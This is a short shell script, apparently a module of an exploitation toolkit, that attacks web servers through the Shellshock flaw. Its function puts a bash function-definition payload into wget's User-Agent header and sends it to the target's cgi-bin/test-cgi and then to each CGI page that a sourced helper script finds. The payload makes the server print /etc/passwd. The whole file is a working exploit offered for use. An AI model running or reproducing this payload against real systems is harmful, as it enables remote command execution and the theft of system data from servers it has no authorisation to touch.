#! /bin/sh
export EXPLOIT_NAME="FindShellShockCGI"
export EXPLOIT_FIRE="shellshockcgi_run"

shellshockcgi_run(){
	alias wget=\wget --user-agent=Mozilla
	EXPLOIT_TMP=$HOME/.tmp/svirfneblin-netmonitor-exploit/$EXPLOIT_NAME
	mkdir -p $EXPLOIT_TMP
	cd $EXPLOIT_TMP
	#attempt to find cgi scripts by exploiting cgi-bin/test-cgi*
	mkdir -p "$EXPLOIT_TMP/$1"
	cd "$EXPLOIT_TMP/$1"
	wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" " http://$1/cgi-bin/test-cgi"
	if [ -f /usr/bin/exploits/http-cgi-testcgils.sh ]; then
		. /usr/bin/exploits/http-cgi-testcgils.sh && CGILS=true
	elif [ -f $HOME/.bin/exploits/http-cgi-testcgils.sh ]; then
		. $HOME/.bin/exploits/http-cgi-testcgils.sh && CGILS=true
	fi
	[ $CGILS ] && CGI_LISTING=$(cgils_run)
	if [ $CGILS ]; then
		for CGI_PAGE in $CGI_LISTING; do
			wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" " http://$1/cgi-bin/$CGI_PAGE"

		done
	fi
#	wget -r "$1"
	#
	#ALL_HTML=$(find ./ -type f -name "*.html" -exec cat {} \;)
	#CGI_SCRIPTS=$(echo $ALL_HTML | grep ".cgi")
}

#wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" $CGI_PAGE